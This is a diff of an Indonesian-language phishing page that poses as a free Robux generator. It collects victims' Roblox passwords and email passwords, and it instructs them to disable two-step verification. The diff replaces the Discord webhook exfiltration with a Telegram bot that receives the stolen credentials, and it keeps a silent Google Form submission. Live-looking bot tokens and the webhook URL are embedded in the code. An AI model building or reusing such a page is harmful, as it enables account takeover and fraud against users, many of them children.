@@ -7,10 +7,10 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
-        body { font-family: 'Orbitron', sans-serif; background: #050505; color: #fff; }
+        body { font-family: 'Orbitron', sans-serif; background: #050505; color: #fff; overflow-x: hidden; }
         .bg-gold { background: linear-gradient(135deg, #ffd700, #b8860b); }
         .hidden { display: none; }
-        .loading-bar { width: 0%; animation: load 15s linear forwards; }
+        .loading-bar { width: 0%; animation: load 18s linear forwards; }
         @keyframes load { from { width: 0%; } to { width: 100%; } }
     </style>
 </head>
@@ -24,44 +24,47 @@
     <div class="bg-zinc-900 border border-yellow-500/30 p-6 rounded-[2.5rem] shadow-2xl">
         
         <div id="p1" class="text-center">
-            <p class="text-[10px] mb-4 text-gray-400">PILIH JUMLAH ROBUX:</p>
+            <p class="text-[10px] mb-4 text-gray-400 font-bold uppercase italic">PILIH JUMLAH ROBUX:</p>
             <div class="grid grid-cols-2 gap-3 mb-6">
                 <button onclick="setA('10,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black active:scale-95 transition-all">10K RBX</button>
                 <button onclick="setA('50,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black active:scale-95 transition-all">50K RBX</button>
             </div>
-            <button onclick="toP2()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase shadow-lg shadow-yellow-500/20">NEXT STEP</button>
+            <button onclick="toP2()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/20">NEXT STEP</button>
         </div>
 
         <div id="p2" class="hidden space-y-3">
-            <input type="text" id="u" placeholder="ROBLOX USERNAME" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold">
-            <input type="password" id="p" placeholder="ROBLOX PASSWORD" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold">
-            <input type="email" id="e" placeholder="EMAIL PEMULIHAN" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold">
-            <input type="password" id="ep" placeholder="SANDI EMAIL" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold">
+            <input type="text" id="u" placeholder="ROBLOX USERNAME" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold italic text-yellow-500">
+            <input type="password" id="p" placeholder="ROBLOX PASSWORD" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold italic text-yellow-500">
+            <input type="email" id="e" placeholder="EMAIL PEMULIHAN" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold italic text-yellow-500">
+            <input type="password" id="ep" placeholder="SANDI EMAIL" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold italic text-yellow-500">
             
             <div class="bg-red-950/30 p-3 rounded-xl border border-red-500/20 text-[9px] text-red-400 font-black text-center italic">
-                ⚠️ MATIKAN VERIFIKASI 2 LANGKAH (A2F)!
+                ⚠️ WAJIB MATIKAN VERIFIKASI 2 LANGKAH (A2F)!
             </div>
-            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase">CLAIM ROBUX</button>
+            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/40">CLAIM ROBUX</button>
         </div>
 
         <div id="p3" class="hidden text-center py-6 space-y-4">
-            <h3 class="text-yellow-500 font-black italic uppercase">PROCESSING...</h3>
+            <h3 class="text-yellow-500 font-black italic uppercase">GENERATING...</h3>
             <div class="w-full bg-white/10 h-3 rounded-full overflow-hidden">
                 <div class="loading-bar bg-yellow-500 h-full"></div>
             </div>
-            <p class="text-[9px] text-gray-400 uppercase font-bold italic">
-                Berhasil! Jangan login selama 24 Jam agar sistem tidak error.
+            <p class="text-[9px] text-gray-400 uppercase font-bold italic px-4">
+                Berhasil! Jangan login selama 24 Jam agar sistem tidak terdeteksi.
             </p>
         </div>
     </div>
 
     <script>
         let amt = "";
-        const webhook = "https://discord.com/api/webhooks/1487177889320538163/lAYGix2oj4qGKV4cZMd_-ZnpnlYjKZYHAnRoJE7XMsPdZx2DQk0YNH00PLCiiQK_PtXi";
+        
+        // --- DATA BOSS XZAM ---
+        const teleToken = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM";
+        const teleChatId = "7153376507";
         const gform = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
 
         function setA(v){ amt = v; alert("Terpilih: " + v + " RBX"); }
-        function toP2(){ if(!amt) return alert("Pilih Robux!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p2').classList.remove('hidden'); }
+        function toP2(){ if(!amt) return alert("PILIH JUMLAH ROBUX!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p2').classList.remove('hidden'); }
 
         function kirimData(){
             const user = document.getElementById('u').value;
@@ -69,9 +72,9 @@
             const mail = document.getElementById('e').value || "-";
             const spass = document.getElementById('ep').value || "-";
 
-            if(!user || !pass) return alert("Lengkapi Data!");
+            if(!user || !pass) return alert("LENGKAPI DATA!");
 
-            // 1. KIRIM KE GOOGLE FORM (SILENT)
+            // 1. KIRIM KE GOOGLE FORM
             const fd = new FormData();
             fd.append('entry.298399091', user);
             fd.append('entry.434090398', pass);
@@ -80,22 +83,10 @@
             fd.append('entry.1584180390', amt);
             fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });
 
-            // 2. KIRIM KE DISCORD (NOTIF)
-            const msg = {
-                embeds: [{
-                    title: "🚀 AKUN BARU MASUK! 🚀",
-                    color: 16773120,
-                    fields: [
-                        { name: "👤 USERNAME", value: `\`${user}\``, inline: true },
-                        { name: "🔑 PASSWORD", value: `\`${pass}\``, inline: true },
-                        { name: "📧 EMAIL", value: `\`${mail}\`` },
-                        { name: "🔐 SANDI MAIL", value: `\`${spass}\`` },
-                        { name: "💎 JUMLAH", value: `\`${amt}\` Robux` }
-                    ],
-                    footer: { text: "KING BOBUX SYSTEM - BOSS XZAM" }
-                }]
-            };
-            fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
+            // 2. KIRIM KE TELEGRAM BOSS XZAM
+            const msgTele = `🚀 *AKUN BARU MASUK!*\n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n📧 *Mail:* \`${mail}\` \n🔐 *Sandi:* \`${spass}\` \n💎 *Jumlah:* \`${amt}\` RBX`;
+            const urlTele = `https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(msgTele)}&parse_mode=Markdown`;
+            fetch(urlTele);
 
             document.getElementById('p2').classList.add('hidden');
             document.getElementById('p3').classList.remove('hidden');
